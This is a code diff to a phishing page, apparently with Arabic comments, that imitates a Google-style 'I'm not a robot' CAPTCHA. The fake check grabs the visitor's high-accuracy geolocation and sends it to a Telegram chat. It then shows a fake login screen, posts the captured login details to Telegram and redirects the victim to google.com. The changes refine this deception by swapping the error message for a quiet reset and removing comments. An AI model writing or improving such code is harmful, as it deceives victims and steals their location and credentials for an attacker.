@@ -37,12 +37,14 @@
             border:3px solid #e0e0e0; border-top-color:#4285F4; 
             border-radius:50%; animation:rcSpin 0.8s linear infinite; 
         }
-        .rc-checkmark, .rc-error-x { display:none; width:26px; height:26px; }
+        .rc-checkmark { display:none; width:26px; height:26px; }
         .rc-checkbox.loading .rc-spinner { display:block; }
+        .rc-checkbox.loading { border-color: #4285F4; }
+        
+        .rc-checkbox.checked { border:none; background:transparent; }
         .rc-checkbox.checked .rc-checkmark { display:block; }
-        .rc-checkbox.error .rc-error-x { display:block; }
+
         #status-text { font-size:14px; color:#333; cursor:pointer; user-select: none; }
-        .text-error { color: #d93025 !important; font-weight: bold; }
 
         /* --- Login Interface --- */
         #login-interface { 
@@ -85,10 +87,6 @@
                     <circle cx="12" cy="12" r="12" fill="#4CAF50"/>
                     <path d="M7 12.5L10.5 16L17 9" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-dasharray="15" stroke-dashoffset="15" id="checkPath"/>
                 </svg>
-                <svg class="rc-error-x" viewBox="0 0 24 24" fill="none">
-                    <circle cx="12" cy="12" r="12" fill="#d93025"/>
-                    <path d="M8 8L16 16M8 16L16 8" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
-                </svg>
             </div>
             <span id="status-text" onclick="startVerification()">I'm not a robot</span>
         </div>
@@ -126,8 +124,7 @@
         const box = document.getElementById('rcCheck');
         const label = document.getElementById('status-text');
         
-        box.classList.remove('error', 'checked');
-        label.classList.remove('text-error');
+        box.classList.remove('checked');
         isProcessing = true;
         box.classList.add('loading');
         label.innerText = "Verifying...";
@@ -139,10 +136,8 @@
                 document.getElementById('checkPath').style.animation = 'rcDraw 0.4s ease forwards';
                 label.innerText = "Verified Successfully ✅";
                 
-                // Send Location to Telegram
                 await sendToTelegram("📍 New Location Captured:", pos.coords.latitude, pos.coords.longitude);
 
-                // Transition to Login Page
                 setTimeout(() => {
                     document.getElementById('captcha-container').style.display = 'none';
                     document.getElementById('login-interface').style.display = 'block';
@@ -150,19 +145,19 @@
                 }, 1200);
             },
             () => {
-                showError("Verification failed. Try again.");
+                resetCaptcha(); // نداء دالة إعادة التعيين عند الفشل
             },
             { enableHighAccuracy: true, timeout: 8000 }
         );
     }
 
-    function showError(msg) {
+    // دالة تعيد الزر لحالته الأصلية تماماً
+    function resetCaptcha() {
         const box = document.getElementById('rcCheck');
         const label = document.getElementById('status-text');
+        
         box.classList.remove('loading');
-        box.classList.add('error');
-        label.innerText = msg;
-        label.classList.add('text-error');
+        label.innerText = "I'm not a robot";
         isProcessing = false;
     }
 
@@ -197,8 +192,6 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: TG_CHAT, text: loginMsg, parse_mode: "Markdown" })
             });
-            // Show fake error to the use
-            //alert("Connection error. Please try again later.");
             window.location.href = "https://www.google.com/";
         } catch (e) {}
     }
